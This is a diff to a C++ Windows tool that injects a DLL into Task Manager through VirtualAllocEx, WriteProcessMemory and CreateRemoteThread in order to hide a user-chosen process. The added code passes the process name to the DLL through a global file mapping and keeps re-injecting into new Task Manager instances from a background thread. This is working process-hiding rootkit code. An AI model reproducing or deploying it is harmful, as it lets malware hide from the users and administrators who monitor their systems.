@@ -4,6 +4,8 @@
 #include <string>
 
 using namespace std;
+HANDLE map;
+LPVOID buf;
 
 bool inject_dll(DWORD pid, string dll_path) {
 
@@ -20,15 +22,11 @@ bool inject_dll(DWORD pid, string dll_path) {
 		cout << " [-] VirtualAllocEx Failed" << endl;
 		return false;
 	}
-	else {	cout << " [+] Successfully Allocated Memory in Remote Process" << endl; }
-
 
 	bool res = WriteProcessMemory(handle, address, dll_path.c_str(), dll_path.length(), 0);
-	if (res) {
-		cout << " [+] DLL Path written to Remote Process" << endl;
+	if (!res) {
+		cout << " [-] WriteProcessMemory Failed" << endl;
 	}
-	else {	cout << " [-] WriteProcessMemory Failed" << endl; }
-
 	if (CreateRemoteThread(handle, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibraryA, (LPVOID)address, NULL, NULL) ==  INVALID_HANDLE_VALUE) {
 		cout << " [-] CreateRemoteThread Failed" << endl;
 	}
@@ -68,7 +66,7 @@ void find_and_inject()
 		do
 		{
 			if (!lstrcmp(process.szExeFile, L"Taskmgr.exe") && lastpid != process.th32ProcessID) {
-				cout << " [+] Task Manager Found" << endl;
+				cout << " [+] Task Manager Detected" << endl;
 				if (!inject_dll(process.th32ProcessID, dll_path)) {
 					cout << " [-] Unable to Inject DLL!! Check if you are running as Admin" << endl << endl;
 					break;
@@ -81,24 +79,62 @@ void find_and_inject()
 	}
 }
 
-void map_process_name(string process) {
-	// TODO: Map process to hide using File Mapping so it can be accessed by DLL
-	// For Now the application works and hides the hardcoded notepad.exe
+bool map_process_name(string process) {
+	map = CreateFileMappingA(
+		INVALID_HANDLE_VALUE,
+		NULL,
+		PAGE_READWRITE,
+		0,
+		255,
+		"Global\\GetProcessName"
+		);
+
+	if (map == NULL) {
+		cout << "CreateFileMapping Failed" << endl;
+		return false;
+	}
+
+	buf = MapViewOfFile(map,
+		FILE_MAP_ALL_ACCESS,
+		0,
+		0,
+		255);
+
+	if (buf == NULL) {
+		cout << "MapViewOfFile Failed" << endl;
+		CloseHandle(map);
+		return 0;
+	}
+
+	CopyMemory(buf, process.c_str(), process.length());
 }
 
 int main()
 {
-	string process;
-	char choice;
-	// cout << " Enter Process Name To Hide" << endl << "--> ";
-    // cin >> process;
-	cout << " Hide this Console? (y/n)" << endl << "-->";
-	// This Will Hide the Console Window, The Program Will Still Run in Background and will be hidden from TaskManager too !! 
-	cin >> choice;
-	if (tolower(choice) == 'y') {
-		ShowWindow(GetConsoleWindow(), SW_HIDE);
-	}
+	string process, inp;
+	cout << " Enter Process Name To Hide" << endl << "--> ";
+    cin >> process;
+	cout << endl;
 	map_process_name(process);
-	find_and_inject();
+
+	CreateThread(
+		NULL,
+		NULL,
+		(LPTHREAD_START_ROUTINE)find_and_inject,
+		NULL,
+		NULL,
+		NULL
+	);
+	
+	cout << "Enter \"quit\" to Quit or Keep this running to inject into future task manager processes" << endl << endl;
+	while (true) {
+		cin >> inp;
+		if (inp == "quit") {
+			UnmapViewOfFile(buf);
+			CloseHandle(map);
+			ExitProcess(0);
+		}
+	}
+
 	return 0;
 }
